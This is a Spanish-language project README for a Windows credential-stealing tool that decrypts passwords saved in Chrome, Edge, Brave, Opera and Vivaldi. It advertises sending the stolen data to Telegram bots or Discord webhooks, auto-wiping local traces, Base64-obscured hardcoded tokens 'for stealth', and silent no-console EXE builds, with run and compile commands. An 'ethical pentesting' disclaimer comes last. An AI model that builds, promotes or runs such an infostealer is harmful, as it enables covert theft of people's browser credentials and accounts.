# 🛡️ Chromium Credentials Auditor Suite

<div align="center">

![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)
![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)
![SQLite](https://img.shields.io/badge/SQLite-07405E?style=for-the-badge&logo=sqlite&logoColor=white)
![Telegram](https://img.shields.io/badge/Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)
![Discord](https://img.shields.io/badge/Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white)

*Una suite avanzada para auditorías de seguridad profesional y pentesting ético en entornos Windows.*

[Reportar Bug](https://github.com/ANONIMO432HZ/decrypt-chromium-suite/issues) | [Solicitar Mejora](https://github.com/ANONIMO432HZ/decrypt-chromium-suite/issues)

</div>

---

## 💻 Compatibilidad del Sistema

| Sistema Operativo | Versiones Soportadas | Arquitectura |
| :--- | :--- | :--- |
| 🪟 **Windows** | Windows 10 / Windows 11 | x64 / x86 |
| 🌐 **Chromium** | v80 o superior (AES-GCM) | Todas |

---

## ✨ Navegadores Soportados

La suite escanea y descifra automáticamente los siguientes objetivos:

* 🌐 **Google Chrome** (Canary, Beta, Stable)
* 🌐 **Microsoft Edge**
* 🦁 **Brave Browser**
* ⭕ **Opera & Opera GX**
* 📐 **Vivaldi**

---

## 🚀 Características Premium

* **📡 Exfiltración Modular**:
  * Envío instantáneo de reportes vía **Bot de Telegram** o **Webhooks de Discord**.
* **📊 Reportes Dinámicos**:
  * Generación de informes estéticos en **HTML Interactivo** o archivos **CSV**.
* **🕵️ Arquitectura de Sigilo (Stealth)**:
  * Limpieza automática de bases de datos temporales y **Auto-Wipe** del reporte local tras exfiltración.

---

## 🛠️ Stack Tecnológico

| Componente | Tecnología Utilizada |
| :--- | :--- |
| **Lenguaje** | `Python 3.x` |
| **Seguridad de OS** | `Windows DPAPI` via `PyWin32` |
| **Criptografía** | `AES-GCM 256` via `PyCryptodomex` |
| **Comunicación** | `Telegram API` & `Discord Webhooks` |
| **Packaging** | `PyInstaller` (Standalone EXE) |

---

## ⚙️ Guía de Uso Rápido

### 1. Instalación de Dependencias

```bash
pip install -r requirements.txt
```

### 2. Comandos Magistrales

> **Generar Reporte HTML Estético:**

```bash
python main.py -f html -o reporte_final
```

> **Exfiltración vía Telegram (Modo Rápido):**

```bash
python main.py -t "TOKEN" -c "ID" # Soporta Texto Plano o Base64
```

### 🔑 Uso Autónomo (Hardcoding)

Puedes pre-configurar el script editando la sección `CREDENCIALES HARDCODED` en `main.py` (Se recomienda usar **Base64** para mayor sigilo). Una vez rellenadas, puedes ejecutar el `.exe` o el script sin parámetros y los datos se enviarán automáticamente.

---

## 📦 Compilación Profesional (.exe)

```bash
# Compilación a un solo archivo (.exe) portable
pyinstaller --onefile --noconsole --name "ChromiumAuditor" main.py
```

---

## 🚦 Panel de Argumentos CLI

| Corto | Largo | Descripción |
| :--- | :--- | :--- |
| `-f` | `--format` | Formato: `html` o `csv`. |
| `-o` | `--output` | Nombre base del archivo de salida. |
| **`-t`** | `--telegram-token` | Token del bot de Telegram (Plano o B64). |
| **`-c`** | `--telegram-chatid` | ID del chat de Telegram (Plano o B64). |
| **`-d`** | `--discord` | URL del Webhook de Discord (Plano o B64). |
| 🧹 | `--no-wipe` | Evita auto-borrado del reporte. |
| 🛠️ | `-v` | Modo verboso (logs detallados). |

---

## ⚖️ Aviso Legal y Ético

> [!CAUTION]
> **ESTE SOFTWARE ES PARA FINES DE PENTESTING ÉTICO Y AUDITORÍA PROFESIONAL.**
> El uso de esta herramienta para acceder a sistemas sin la autorización explícita del propietario es ilegal. El autor no asume responsabilidad por el mal uso de esta suite.

---
